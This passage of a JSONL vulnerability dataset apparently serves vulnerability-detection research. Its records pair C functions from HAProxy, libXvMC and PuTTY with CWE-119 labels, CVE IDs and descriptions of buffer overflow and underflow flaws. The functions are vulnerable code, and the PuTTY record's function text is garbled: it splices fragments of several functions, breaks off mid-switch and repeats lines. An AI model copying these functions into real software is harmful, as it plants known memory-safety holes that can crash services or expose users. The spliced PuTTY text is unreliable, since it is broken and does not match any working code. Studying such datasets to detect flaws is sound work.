h2s);\n\t\t\tbreak;\n\n\t\tcase H2_FT_GOAWAY:\n\t\t\tif (h2c->st0 == H2_CS_FRAME_P)\n\t\t\t\tret = h2c_handle_goaway(h2c);\n\t\t\tbreak;\n\n\t\tcase H2_FT_PUSH_PROMISE:\n\t\t\t/* not permitted here, RFC7540#5.1 */\n\t\t\th2c_error(h2c, H2_ERR_PROTOCOL_ERROR);\n\t\t\tbreak;\n\n\t\t\t/* implement all extra frame types here */\n\t\tdefault:\n\t\t\t/* drop frames that we ignore. They may be larger than\n\t\t\t * the buffer so we drain all of their contents until\n\t\t\t * we reach the end.\n\t\t\t */\n\t\t\tret = MIN(h2c->dbuf->i, h2c->dfl);\n\t\t\tbi_del(h2c->dbuf, ret);\n\t\t\th2c->dfl -= ret;\n\t\t\tret = h2c->dfl == 0;\n\t\t}\n\n\tstrm_err:\n\t\t/* We may have to send an RST if not done yet */\n\t\tif (h2s->st == H2_SS_ERROR)\n\t\t\th2c->st0 = H2_CS_FRAME_E;\n\n\t\tif (h2c->st0 == H2_CS_FRAME_E)\n\t\t\tret = h2c_send_rst_stream(h2c, h2s);\n\n\t\t/* error or missing data condition met above ? */\n\t\tif (ret <= 0)\n\t\t\tbreak;\n\n\t\tif (h2c->st0 != H2_CS_FRAME_H) {\n\t\t\tbi_del(h2c->dbuf, h2c->dfl);\n\t\t\th2c->st0 = H2_CS_FRAME_H;\n\t\t}\n\t}\n\n\tif (h2c->rcvd_c > 0 &&\n\t    !(h2c->flags & (H2_CF_MUX_MFULL | H2_CF_DEM_MBUSY | H2_CF_DEM_MROOM)))\n\t\th2c_send_conn_wu(h2c);\n\n fail:\n\t/* we can go here on missing data, blocked response or error */\n\treturn;\n}\n", "func_hash": 197791135802871490452896068201538076195, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2018-10184", "cve_desc": "An issue was discovered in HAProxy before 1.8.8. The incoming H2 frame length was checked against the max_frame_size setting instead of being checked against the bufsize. The max_frame_size only applies to outgoing traffic and not to incoming, so if a large enough frame size is advertised in the SETTINGS frame, a wrapped frame will be defragmented into a temporary allocated buffer where the second fragment may overflow the heap by up to 16 kB. It is very unlikely that this can be exploited for code execution given that buffers are very short lived and their addresses not realistically predictable in production, but the likelihood of an immediate crash is absolutely certain.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10184"}
{"idx": 223, "project": "libXvMC", "commit_id": "2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXvMC/commit/?id=2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXvMC/commit/?id=2cd95e7da8367cccdcdd5c9b160012d1dec5cbdb", "commit_message": "None", "target": 1, "func": "Status XvMCGetDRInfo(Display *dpy, XvPortID port,\n\t\t     char **name, char **busID,\n\t\t     int *major, int *minor,\n\t\t     int *patchLevel,\n\t\t     int *isLocal)\n{\n    XExtDisplayInfo *info = xvmc_find_display(dpy);\n    xvmcGetDRInfoReply rep;\n    xvmcGetDRInfoReq  *req;\n    CARD32 magic;\n\n#ifdef HAVE_SHMAT\n    volatile CARD32 *shMem;\n    struct timezone here;\n    struct timeval now;\n    here.tz_minuteswest = 0;\n    here.tz_dsttime = 0;\n#endif\n\n    *name = NULL;\n    *busID = NULL;\n\n    XvMCCheckExtension (dpy, info, BadImplementation);\n\n    LockDisplay (dpy);\n    XvMCGetReq (GetDRInfo, req);\n\n    req->port = port;\n    magic = 0;\n    req->magic = 0;\n#ifdef HAVE_SHMAT\n    req->shmKey = shmget(IPC_PRIVATE, 1024, IPC_CREAT | 0600);\n\n    /*\n     * We fill a shared memory page with a repetitive pattern. If the\n     * X server can read this pattern, we probably have a local connection.\n     * Note that we can trigger the remote X server to read any shared\n     * page on the remote machine, so we shouldn't be able to guess and verify\n     * any complicated data on those pages. Thats the explanation of this\n     * otherwise stupid-looking pattern algorithm.\n     */\n\n    if (req->shmKey >= 0) {\n\tshMem = (CARD32 *) shmat(req->shmKey, NULL, 0);\n\tshmctl( req->shmKey, IPC_RMID, NULL);\n\tif ( shMem ) {\n\n\t    register volatile CARD32 *shMemC = shMem;\n\t    register int i;\n\n\t    gettimeofday( &now, &here);\n\t    magic = now.tv_usec & 0x000FFFFF;\n\t    req->magic = magic;\n\t    i = 1024 / sizeof(CARD32);\n\t    while(i--) {\n\t        *shMemC++ = magic;\n\t        magic = ~magic;\n\t    }\n\t} else {\n\t    req->shmKey = -1;\n\t}\n    }\n#else\n    req->shmKey = 0;\n#endif\n    if (!_XReply (dpy, (xReply *) &rep, 0, xFalse)) {\n        UnlockDisplay (dpy);\n        SyncHandle ();\n#ifdef HAVE_SHMAT\n\tif ( req->shmKey >= 0) {\n\t    shmdt( (const void *) shMem );\n\t}\n#endif\n        return -1;\n    }\n#ifdef HAVE_SHMAT\n    shmdt( (const void *) shMem );\n#endif\n\n    if (rep.length > 0) {\n\tunsigned long realSize = 0;\n\tchar *tmpBuf = NULL;\n\n\tif ((rep.length < (INT_MAX >> 2)) &&\n\t    /* protect against overflow in strncpy below */\n\t    (rep.nameLen + rep.busIDLen > rep.nameLen)) {\n\t    realSize = rep.length << 2;\n\t    if (realSize >= (rep.nameLen + rep.busIDLen)) {\n\t\ttmpBuf = Xmalloc(realSize);\n\t\t*name = Xmalloc(rep.nameLen);\n\t\t*busID = Xmalloc(rep.busIDLen);\n\t    }\n\t}\n\n \tif (*name && *busID && tmpBuf) {\n \t    _XRead(dpy, tmpBuf, realSize);\n \t    strncpy(*name,tmpBuf,rep.nameLen);\n\t    (*name)[rep.nameLen - 1] = '\\0';\n \t    strncpy(*busID,tmpBuf+rep.nameLen,rep.busIDLen);\n\t    (*busID)[rep.busIDLen - 1] = '\\0';\n \t    XFree(tmpBuf);\n \t} else {\n \t    XFree(*name);\n\t    *name = NULL;\n\t    XFree(*busID);\n\t    *busID = NULL;\n\t    XFree(tmpBuf);\n\n\t    _XEatDataWords(dpy, rep.length);\n\t    UnlockDisplay (dpy);\n\t    SyncHandle ();\n\t    return -1;\n\n\t}\n    }\n\n    UnlockDisplay (dpy);\n    SyncHandle ();\n    *major = rep.major;\n    *minor = rep.minor;\n    *patchLevel = rep.patchLevel;\n    *isLocal = (req->shmKey > 0) ? rep.isLocal : 1;\n    return (rep.length > 0) ? Success : BadImplementation;\n}\n", "func_hash": 225773238597816987128397211875317401076, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-7953", "cve_desc": "Buffer underflow in X.org libXvMC before 1.0.10 allows remote X servers to have unspecified impact via an empty string.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-7953"}
{"idx": 233, "project": "tartarus", "commit_id": "4ff22863d895cb7ebfced4cf923a012a614adaa8", "project_url": "https://git.tartarus.org/?p=simon/putty", "commit_url": "https://git.tartarus.org/?p=simon/putty.git;a=commitdiff;h=4ff22863d895cb7ebfced4cf923a012a614adaa8", "commit_message": "None", "target": 1, "func": "static void ssh_throttle_all(Ssh ssh, int enable, int bufsize)\n{\n    int i;\n    struct ssh_channel *c;\n\n    if (enable == ssh->throttled_all)\n\treturn;\n    ssh->throttled_all = enable;\n    ssh->overall_bufsize = bufsize;\n    if (!ssh->channels)\n\treturn;\n    for (i = 0; NULL != (c = index234(ssh->channels, i)); i++) {\n\tswitch (c->type) {\n\t  case CHAN_MAINSESSION:\n\t    /*\n\t     * This is treated separately, outside the switch.\n\t     */\n\t    break;\n            x11_override_throttle(c->u.x11.xconn, enable);\n            break;\n          case CHAN_AGENT:\n           /* Agent channels require no buffer management. */\n            break;\n          case CHAN_SOCKDATA:\n            pfd_override_throttle(c->u.pfd.pf, enable);\n\nstatic void ssh_agent_callback(void *sshv, void *reply, int replylen)\n{\n    Ssh ssh = (Ssh) sshv;\n\n    ssh->auth_agent_query = NULL;\n\n    ssh->agent_response = reply;\n    ssh->agent_response_len = replylen;\n\n    if (ssh->version == 1)\n\tdo_ssh1_login(ssh, NULL, -1, NULL);\n    else\n\tdo_ssh2_authconn(ssh, NULL, -1, NULL);\n}\n\nstatic void ssh_dialog_callback(void *sshv, int ret)\n{\n    Ssh ssh = (Ssh) sshv;\n\n    ssh->user_response = ret;\n\n    if (ssh->version == 1)\n\tdo_ssh1_login(ssh, NULL, -1, NULL);\n    else\n\tdo_ssh2_transport(ssh, NULL, -1, NULL);\n\n    /*\n     * This may have unfrozen the SSH connection, so do a\n     * queued-data run.\n     */\n    ssh_process_queued_incoming_data(ssh);\n}\n\nstatic void ssh_agentf_callback(void *cv, void *reply, int replylen)\n     ssh_process_queued_incoming_data(ssh);\n }\n \nstatic void ssh_agentf_callback(void *cv, void *reply, int replylen)\n {\n    struct ssh_channel *c = (struct ssh_channel *)cv;\n    const void *sentreply = reply;\n     c->u.a.pending = NULL;\n    c->u.a.outstanding_requests--;\n    if (!sentreply) {\n       /* Fake SSH_AGENT_FAILURE. */\n       sentreply = \"\\0\\0\\0\\1\\5\";\n        replylen = 5;\n     }\n    ssh_send_channel_data(c, sentreply, replylen);\n    if (reply)\n       sfree(reply);\n     /*\n     * If we've already seen an incoming EOF but haven't sent an\n     * outgoing one, this may be the moment to send it.\n      */\n    if (c->u.a.outstanding_requests == 0 && (c->closes & CLOSES_RCVD_EOF))\n         sshfwd_write_eof(c);\n }\n \n /*\n  * Client-initiated disconnection. Send a DISCONNECT if `wire_reason'\n  * non-NULL, otherwise just close the connection. `client_reason' == NULL\n\t\t\t struct Packet *pktin)\n{\n    int i, j, ret;\n    unsigned char cookie[8], *ptr;\n    struct MD5Context md5c;\n    struct do_ssh1_login_state {\n\tint crLine;\n\tint len;\n\tunsigned char *rsabuf;\n        const unsigned char *keystr1, *keystr2;\n\tunsigned long supported_ciphers_mask, supported_auths_mask;\n\tint tried_publickey, tried_agent;\n\tint tis_auth_refused, ccard_auth_refused;\n\tunsigned char session_id[16];\n\tint cipher_type;\n\tvoid *publickey_blob;\n\tint publickey_bloblen;\n\tchar *publickey_comment;\n\tint privatekey_available, privatekey_encrypted;\n\tprompts_t *cur_prompt;\n\tchar c;\n\tint pwpkt_type;\n\tunsigned char request[5], *response, *p;\n\tint responselen;\n\tint keyi, nkeys;\n\tint authed;\n\tstruct RSAKey key;\n\tBignum challenge;\n\tchar *commentp;\n\tint commentlen;\n        int dlgret;\n\tFilename *keyfile;\n        struct RSAKey servkey, hostkey;\n    };\n    crState(do_ssh1_login_state);\n\n    crBeginState;\n\n    if (!pktin)\n\tcrWaitUntil(pktin);\n\n    if (pktin->type != SSH1_SMSG_PUBLIC_KEY) {\n\tbombout((\"Public key packet not received\"));\n\tcrStop(0);\n    }\n\n    logevent(\"Received public keys\");\n\n    ptr = ssh_pkt_getdata(pktin, 8);\n    if (!ptr) {\n\tbombout((\"SSH-1 public key packet stopped before random cookie\"));\n\tcrStop(0);\n    }\n    memcpy(cookie, ptr, 8);\n\n    if (!ssh1_pkt_getrsakey(pktin, &s->servkey, &s->keystr1) ||\n\t!ssh1_pkt_getrsakey(pktin, &s->hostkey, &s->keystr2)) {\t\n\tbombout((\"Failed to read SSH-1 public keys from public key packet\"));\n\tcrStop(0);\n    }\n\n    /*\n     * Log the host key fingerprint.\n     */\n    {\n\tchar logmsg[80];\n\tlogevent(\"Host key fingerprint is:\");\n\tstrcpy(logmsg, \"      \");\n\ts->hostkey.comment = NULL;\n\trsa_fingerprint(logmsg + strlen(logmsg),\n\t\t\tsizeof(logmsg) - strlen(logmsg), &s->hostkey);\n\tlogevent(logmsg);\n    }\n\n    ssh->v1_remote_protoflags = ssh_pkt_getuint32(pktin);\n    s->supported_ciphers_mask = ssh_pkt_getuint32(pktin);\n    s->supported_auths_mask = ssh_pkt_getuint32(pktin);\n    if ((ssh->remote_bugs & BUG_CHOKES_ON_RSA))\n\ts->supported_auths_mask &= ~(1 << SSH1_AUTH_RSA);\n\n    ssh->v1_local_protoflags =\n\tssh->v1_remote_protoflags & SSH1_PROTOFLAGS_SUPPORTED;\n    ssh->v1_local_protoflags |= SSH1_PROTOFLAG_SCREEN_NUMBER;\n\n    MD5Init(&md5c);\n    MD5Update(&md5c, s->keystr2, s->hostkey.bytes);\n    MD5Update(&md5c, s->keystr1, s->servkey.bytes);\n    MD5Update(&md5c, cookie, 8);\n    MD5Final(s->session_id, &md5c);\n\n    for (i = 0; i < 32; i++)\n\tssh->session_key[i] = random_byte();\n\n    /*\n     * Verify that the `bits' and `bytes' parameters match.\n     */\n    if (s->hostkey.bits > s->hostkey.bytes * 8 ||\n\ts->servkey.bits > s->servkey.bytes * 8) {\n\tbombout((\"SSH-1 public keys were badly formatted\"));\n\tcrStop(0);\n    }\n\n    s->len = (s->hostkey.bytes > s->servkey.bytes ?\n              s->hostkey.bytes : s->servkey.bytes);\n\n    s->rsabuf = snewn(s->len, unsigned char);\n\n    /*\n     * Verify the host key.\n     */\n    {\n\t/*\n\t * First format the key into a string.\n\t */\n\tint len = rsastr_len(&s->hostkey);\n\tchar fingerprint[100];\n\tchar *keystr = snewn(len, char);\n\trsastr_fmt(keystr, &s->hostkey);\n\trsa_fingerprint(fingerprint, sizeof(fingerprint), &s->hostkey);\n\n        /* First check against manually configured host keys. */\n        s->dlgret = verify_ssh_manual_host_key(ssh, fingerprint, NULL, NULL);\n        if (s->dlgret == 0) {          /* did not match */\n            bombout((\"Host key did not appear in manually configured list\"));\n            sfree(keystr);\n            crStop(0);\n        } else if (s->dlgret < 0) { /* none configured; use standard handling */\n            ssh_set_frozen(ssh, 1);\n            s->dlgret = verify_ssh_host_key(ssh->frontend,\n                                            ssh->savedhost, ssh->savedport,\n                                            \"rsa\", keystr, fingerprint,\n                                            ssh_dialog_callback, ssh);\n            sfree(keystr);\n#ifdef FUZZING\n\t    s->dlgret = 1;\n#endif\n            if (s->dlgret < 0) {\n                do {\n                    crReturn(0);\n                    if (pktin) {\n                        bombout((\"Unexpected data from server while waiting\"\n                                 \" for user host key response\"));\n                        crStop(0);\n                    }\n                } while (pktin || inlen > 0);\n                s->dlgret = ssh->user_response;\n            }\n            ssh_set_frozen(ssh, 0);\n\n            if (s->dlgret == 0) {\n                ssh_disconnect(ssh, \"User aborted at host key verification\",\n                               NULL, 0, TRUE);\n                crStop(0);\n            }\n        } else {\n            sfree(keystr);\n        }\n    }\n\n    for (i = 0; i < 32; i++) {\n\ts->rsabuf[i] = ssh->session_key[i];\n\tif (i < 16)\n\t    s->rsabuf[i] ^= s->session_id[i];\n    }\n\n    if (s->hostkey.bytes > s->servkey.bytes) {\n\tret = rsaencrypt(s->rsabuf, 32, &s->servkey);\n\tif (ret)\n\t    ret = rsaencrypt(s->rsabuf, s->servkey.bytes, &s->hostkey);\n    } else {\n\tret = rsaencrypt(s->rsabuf, 32, &s->hostkey);\n\tif (ret)\n\t    ret = rsaencrypt(s->rsabuf, s->hostkey.bytes, &s->servkey);\n    }\n    if (!ret) {\n\tbombout((\"SSH-1 public key encryptions failed due to bad formatting\"));\n\tcrStop(0);\t\n    }\n\n    logevent(\"Encrypted session key\");\n\n    {\n\tint cipher_chosen = 0, warn = 0;\n\tconst char *cipher_string = NULL;\n\tint i;\n\tfor (i = 0; !cipher_chosen && i < CIPHER_MAX; i++) {\n\t    int next_cipher = conf_get_int_int(ssh->conf,\n\t\t\t\t\t       CONF_ssh_cipherlist, i);\n\t    if (next_cipher == CIPHER_WARN) {\n\t\t/* If/when we choose a cipher, warn about it */\n\t\twarn = 1;\n\t    } else if (next_cipher == CIPHER_AES) {\n\t\t/* XXX Probably don't need to mention this. */\n\t\tlogevent(\"AES not supported in SSH-1, skipping\");\n\t    } else {\n\t\tswitch (next_cipher) {\n\t\t  case CIPHER_3DES:     s->cipher_type = SSH_CIPHER_3DES;\n\t\t\t\t\tcipher_string = \"3DES\"; break;\n\t\t  case CIPHER_BLOWFISH: s->cipher_type = SSH_CIPHER_BLOWFISH;\n\t\t\t\t\tcipher_string = \"Blowfish\"; break;\n\t\t  case CIPHER_DES:\ts->cipher_type = SSH_CIPHER_DES;\n\t\t\t\t\tcipher_string = \"single-DES\"; break;\n\t\t}\n\t\tif (s->supported_ciphers_mask & (1 << s->cipher_type))\n\t\t    cipher_chosen = 1;\n\t    }\n\t}\n\tif (!cipher_chosen) {\n\t    if ((s->supported_ciphers_mask & (1 << SSH_CIPHER_3DES)) == 0)\n\t\tbombout((\"Server violates SSH-1 protocol by not \"\n\t\t\t \"supporting 3DES encryption\"));\n\t    else\n\t\t/* shouldn't happen */\n\t\tbombout((\"No supported ciphers found\"));\n\t    crStop(0);\n\t}\n\n\t/* Warn about chosen cipher if necessary. */\n\tif (warn) {\n            ssh_set_frozen(ssh, 1);\n\t    s->dlgret = askalg(ssh->frontend, \"cipher\", cipher_string,\n\t\t\t       ssh_dialog_callback, ssh);\n\t    if (s->dlgret < 0) {\n\t\tdo {\n\t\t    crReturn(0);\n\t\t    if (pktin) {\n\t\t\tbombout((\"Unexpected data from server while waiting\"\n\t\t\t\t \" for user response\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t} while (pktin || inlen > 0);\n\t\ts->dlgret = ssh->user_response;\n\t    }\n            ssh_set_frozen(ssh, 0);\n\t    if (s->dlgret == 0) {\n\t\tssh_disconnect(ssh, \"User aborted at cipher warning\", NULL,\n\t\t\t       0, TRUE);\n\t\tcrStop(0);\n\t    }\n        }\n    }\n\n    switch (s->cipher_type) {\n      case SSH_CIPHER_3DES:\n\tlogevent(\"Using 3DES encryption\");\n\tbreak;\n      case SSH_CIPHER_DES:\n\tlogevent(\"Using single-DES encryption\");\n\tbreak;\n      case SSH_CIPHER_BLOWFISH:\n\tlogevent(\"Using Blowfish encryption\");\n\tbreak;\n    }\n\n    send_packet(ssh, SSH1_CMSG_SESSION_KEY,\n\t\tPKT_CHAR, s->cipher_type,\n\t\tPKT_DATA, cookie, 8,\n\t\tPKT_CHAR, (s->len * 8) >> 8, PKT_CHAR, (s->len * 8) & 0xFF,\n\t\tPKT_DATA, s->rsabuf, s->len,\n\t\tPKT_INT, ssh->v1_local_protoflags, PKT_END);\n\n    logevent(\"Trying to enable encryption...\");\n\n    sfree(s->rsabuf);\n\n    ssh->cipher = (s->cipher_type == SSH_CIPHER_BLOWFISH ? &ssh_blowfish_ssh1 :\n\t\t   s->cipher_type == SSH_CIPHER_DES ? &ssh_des :\n\t\t   &ssh_3des);\n    ssh->v1_cipher_ctx = ssh->cipher->make_context();\n    ssh->cipher->sesskey(ssh->v1_cipher_ctx, ssh->session_key);\n    logeventf(ssh, \"Initialised %s encryption\", ssh->cipher->text_name);\n\n    ssh->crcda_ctx = crcda_make_context();\n    logevent(\"Installing CRC compensation attack detector\");\n\n    if (s->servkey.modulus) {\n\tsfree(s->servkey.modulus);\n\ts->servkey.modulus = NULL;\n    }\n    if (s->servkey.exponent) {\n\tsfree(s->servkey.exponent);\n\ts->servkey.exponent = NULL;\n    }\n    if (s->hostkey.modulus) {\n\tsfree(s->hostkey.modulus);\n\ts->hostkey.modulus = NULL;\n    }\n    if (s->hostkey.exponent) {\n\tsfree(s->hostkey.exponent);\n\ts->hostkey.exponent = NULL;\n    }\n    crWaitUntil(pktin);\n\n    if (pktin->type != SSH1_SMSG_SUCCESS) {\n\tbombout((\"Encryption not successfully enabled\"));\n\tcrStop(0);\n    }\n\n    logevent(\"Successfully started encryption\");\n\n    fflush(stdout); /* FIXME eh? */\n    {\n\tif ((ssh->username = get_remote_username(ssh->conf)) == NULL) {\n\t    int ret; /* need not be kept over crReturn */\n\t    s->cur_prompt = new_prompts(ssh->frontend);\n\t    s->cur_prompt->to_server = TRUE;\n\t    s->cur_prompt->name = dupstr(\"SSH login name\");\n\t    add_prompt(s->cur_prompt, dupstr(\"login as: \"), TRUE);\n\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t    while (ret < 0) {\n\t\tssh->send_ok = 1;\n\t\tcrWaitUntil(!pktin);\n\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\tssh->send_ok = 0;\n\t    }\n\t    if (!ret) {\n\t\t/*\n\t\t * Failed to get a username. Terminate.\n\t\t */\n\t\tfree_prompts(s->cur_prompt);\n\t\tssh_disconnect(ssh, \"No username provided\", NULL, 0, TRUE);\n\t\tcrStop(0);\n\t    }\n\t    ssh->username = dupstr(s->cur_prompt->prompts[0]->result);\n\t    free_prompts(s->cur_prompt);\n\t}\n\n\tsend_packet(ssh, SSH1_CMSG_USER, PKT_STR, ssh->username, PKT_END);\n\t{\n\t    char *userlog = dupprintf(\"Sent username \\\"%s\\\"\", ssh->username);\n\t    logevent(userlog);\n\t    if (flags & FLAG_INTERACTIVE &&\n\t\t(!((flags & FLAG_STDERR) && (flags & FLAG_VERBOSE)))) {\n\t\tc_write_str(ssh, userlog);\n\t\tc_write_str(ssh, \"\\r\\n\");\n\t    }\n\t    sfree(userlog);\n\t}\n    }\n\n    crWaitUntil(pktin);\n\n    if ((s->supported_auths_mask & (1 << SSH1_AUTH_RSA)) == 0) {\n\t/* We must not attempt PK auth. Pretend we've already tried it. */\n\ts->tried_publickey = s->tried_agent = 1;\n    } else {\n\ts->tried_publickey = s->tried_agent = 0;\n    }\n    s->tis_auth_refused = s->ccard_auth_refused = 0;\n    /*\n     * Load the public half of any configured keyfile for later use.\n     */\n    s->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n    if (!filename_is_null(s->keyfile)) {\n\tint keytype;\n\tlogeventf(ssh, \"Reading key file \\\"%.150s\\\"\",\n\t\t  filename_to_str(s->keyfile));\n\tkeytype = key_type(s->keyfile);\n\tif (keytype == SSH_KEYTYPE_SSH1 ||\n            keytype == SSH_KEYTYPE_SSH1_PUBLIC) {\n\t    const char *error;\n\t    if (rsakey_pubblob(s->keyfile,\n\t\t\t       &s->publickey_blob, &s->publickey_bloblen,\n\t\t\t       &s->publickey_comment, &error)) {\n                s->privatekey_available = (keytype == SSH_KEYTYPE_SSH1);\n                if (!s->privatekey_available)\n                    logeventf(ssh, \"Key file contains public key only\");\n\t\ts->privatekey_encrypted = rsakey_encrypted(s->keyfile,\n                                                           NULL);\n\t    } else {\n\t\tchar *msgbuf;\n\t\tlogeventf(ssh, \"Unable to load key (%s)\", error);\n\t\tmsgbuf = dupprintf(\"Unable to load key file \"\n\t\t\t\t   \"\\\"%.150s\\\" (%s)\\r\\n\",\n\t\t\t\t   filename_to_str(s->keyfile),\n\t\t\t\t   error);\n\t\tc_write_str(ssh, msgbuf);\n\t\tsfree(msgbuf);\n\t\ts->publickey_blob = NULL;\n\t    }\n\t} else {\n\t    char *msgbuf;\n\t    logeventf(ssh, \"Unable to use this key file (%s)\",\n\t\t      key_type_to_str(keytype));\n\t    msgbuf = dupprintf(\"Unable to use key file \\\"%.150s\\\"\"\n\t\t\t       \" (%s)\\r\\n\",\n\t\t\t       filename_to_str(s->keyfile),\n\t\t\t       key_type_to_str(keytype));\n\t    c_write_str(ssh, msgbuf);\n\t    sfree(msgbuf);\n\t    s->publickey_blob = NULL;\n\t}\n    } else\n\ts->publickey_blob = NULL;\n\n    while (pktin->type == SSH1_SMSG_FAILURE) {\n\ts->pwpkt_type = SSH1_CMSG_AUTH_PASSWORD;\n\n\tif (conf_get_int(ssh->conf, CONF_tryagent) && agent_exists() && !s->tried_agent) {\n\t    /*\n\t     * Attempt RSA authentication using Pageant.\n\t     */\n\t    void *r;\n\n\t    s->authed = FALSE;\n\t    s->tried_agent = 1;\n\t    logevent(\"Pageant is running. Requesting keys.\");\n\n\t    /* Request the keys held by the agent. */\n\t    PUT_32BIT(s->request, 1);\n\t    s->request[4] = SSH1_AGENTC_REQUEST_RSA_IDENTITIES;\n            ssh->auth_agent_query = agent_query(\n                s->request, 5, &r, &s->responselen, ssh_agent_callback, ssh);\n\t    if (ssh->auth_agent_query) {\n\t\tdo {\n\t\t    crReturn(0);\n\t\t    if (pktin) {\n\t\t\tbombout((\"Unexpected data from server while waiting\"\n\t\t\t\t \" for agent response\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t} while (pktin || inlen > 0);\n\t\tr = ssh->agent_response;\n\t\ts->responselen = ssh->agent_response_len;\n\t    }\n\t    s->response = (unsigned char *) r;\n\t    if (s->response && s->responselen >= 5 &&\n\t\ts->response[4] == SSH1_AGENT_RSA_IDENTITIES_ANSWER) {\n\t\ts->p = s->response + 5;\n\t\ts->nkeys = toint(GET_32BIT(s->p));\n                if (s->nkeys < 0) {\n                    logeventf(ssh, \"Pageant reported negative key count %d\",\n                              s->nkeys);\n                    s->nkeys = 0;\n                }\n\t\ts->p += 4;\n\t\tlogeventf(ssh, \"Pageant has %d SSH-1 keys\", s->nkeys);\n\t\tfor (s->keyi = 0; s->keyi < s->nkeys; s->keyi++) {\n\t\t    unsigned char *pkblob = s->p;\n\t\t    s->p += 4;\n\t\t    {\n\t\t\tint n, ok = FALSE;\n\t\t\tdo {\t       /* do while (0) to make breaking easy */\n\t\t\t    n = ssh1_read_bignum\n\t\t\t\t(s->p, toint(s->responselen-(s->p-s->response)),\n\t\t\t\t &s->key.exponent);\n\t\t\t    if (n < 0)\n\t\t\t\tbreak;\n\t\t\t    s->p += n;\n\t\t\t    n = ssh1_read_bignum\n\t\t\t\t(s->p, toint(s->responselen-(s->p-s->response)),\n\t\t\t\t &s->key.modulus);\n\t\t\t    if (n < 0)\n                                break;\n\t\t\t    s->p += n;\n\t\t\t    if (s->responselen - (s->p-s->response) < 4)\n\t\t\t\tbreak;\n\t\t\t    s->commentlen = toint(GET_32BIT(s->p));\n\t\t\t    s->p += 4;\n\t\t\t    if (s->commentlen < 0 ||\n                                toint(s->responselen - (s->p-s->response)) <\n\t\t\t\ts->commentlen)\n\t\t\t\tbreak;\n\t\t\t    s->commentp = (char *)s->p;\n\t\t\t    s->p += s->commentlen;\n\t\t\t    ok = TRUE;\n\t\t\t} while (0);\n\t\t\tif (!ok) {\n\t\t\t    logevent(\"Pageant key list packet was truncated\");\n\t\t\t    break;\n\t\t\t}\n\t\t    }\n\t\t    if (s->publickey_blob) {\n\t\t\tif (!memcmp(pkblob, s->publickey_blob,\n\t\t\t\t    s->publickey_bloblen)) {\n\t\t\t    logeventf(ssh, \"Pageant key #%d matches \"\n\t\t\t\t      \"configured key file\", s->keyi);\n\t\t\t    s->tried_publickey = 1;\n\t\t\t} else\n\t\t\t    /* Skip non-configured key */\n\t\t\t    continue;\n\t\t    }\n\t\t    logeventf(ssh, \"Trying Pageant key #%d\", s->keyi);\n\t\t    send_packet(ssh, SSH1_CMSG_AUTH_RSA,\n\t\t\t\tPKT_BIGNUM, s->key.modulus, PKT_END);\n\t\t    crWaitUntil(pktin);\n\t\t    if (pktin->type != SSH1_SMSG_AUTH_RSA_CHALLENGE) {\n\t\t\tlogevent(\"Key refused\");\n\t\t\tcontinue;\n\t\t    }\n\t\t    logevent(\"Received RSA challenge\");\n\t\t    if ((s->challenge = ssh1_pkt_getmp(pktin)) == NULL) {\n\t\t\tbombout((\"Server's RSA challenge was badly formatted\"));\n\t\t\tcrStop(0);\n\t\t    }\n\n\t\t    {\n\t\t\tchar *agentreq, *q, *ret;\n\t\t\tvoid *vret;\n\t\t\tint len, retlen;\n\t\t\tlen = 1 + 4;   /* message type, bit count */\n\t\t\tlen += ssh1_bignum_length(s->key.exponent);\n\t\t\tlen += ssh1_bignum_length(s->key.modulus);\n\t\t\tlen += ssh1_bignum_length(s->challenge);\n\t\t\tlen += 16;     /* session id */\n\t\t\tlen += 4;      /* response format */\n\t\t\tagentreq = snewn(4 + len, char);\n\t\t\tPUT_32BIT(agentreq, len);\n\t\t\tq = agentreq + 4;\n\t\t\t*q++ = SSH1_AGENTC_RSA_CHALLENGE;\n\t\t\tPUT_32BIT(q, bignum_bitcount(s->key.modulus));\n\t\t\tq += 4;\n\t\t\tq += ssh1_write_bignum(q, s->key.exponent);\n\t\t\tq += ssh1_write_bignum(q, s->key.modulus);\n\t\t\tq += ssh1_write_bignum(q, s->challenge);\n\t\t\tmemcpy(q, s->session_id, 16);\n\t\t\tq += 16;\n\t\t\tPUT_32BIT(q, 1);\t/* response format */\n                        ssh->auth_agent_query = agent_query(\n                            agentreq, len + 4, &vret, &retlen,\n                            ssh_agent_callback, ssh);\n\t\t\tif (ssh->auth_agent_query) {\n\t\t\t    sfree(agentreq);\n\t\t\t    do {\n\t\t\t\tcrReturn(0);\n\t\t\t\tif (pktin) {\n\t\t\t\t    bombout((\"Unexpected data from server\"\n\t\t\t\t\t     \" while waiting for agent\"\n\t\t\t\t\t     \" response\"));\n\t\t\t\t    crStop(0);\n\t\t\t\t}\n\t\t\t    } while (pktin || inlen > 0);\n\t\t\t    vret = ssh->agent_response;\n\t\t\t    retlen = ssh->agent_response_len;\n\t\t\t} else\n\t\t\t    sfree(agentreq);\n\t\t\tret = vret;\n\t\t\tif (ret) {\n\t\t\t    if (ret[4] == SSH1_AGENT_RSA_RESPONSE) {\n\t\t\t\tlogevent(\"Sending Pageant's response\");\n\t\t\t\tsend_packet(ssh, SSH1_CMSG_AUTH_RSA_RESPONSE,\n\t\t\t\t\t    PKT_DATA, ret + 5, 16,\n\t\t\t\t\t    PKT_END);\n\t\t\t\tsfree(ret);\n\t\t\t\tcrWaitUntil(pktin);\n\t\t\t\tif (pktin->type == SSH1_SMSG_SUCCESS) {\n\t\t\t\t    logevent\n\t\t\t\t\t(\"Pageant's response accepted\");\n\t\t\t\t    if (flags & FLAG_VERBOSE) {\n\t\t\t\t\tc_write_str(ssh, \"Authenticated using\"\n\t\t\t\t\t\t    \" RSA key \\\"\");\n\t\t\t\t\tc_write(ssh, s->commentp,\n\t\t\t\t\t\ts->commentlen);\n\t\t\t\t\tc_write_str(ssh, \"\\\" from 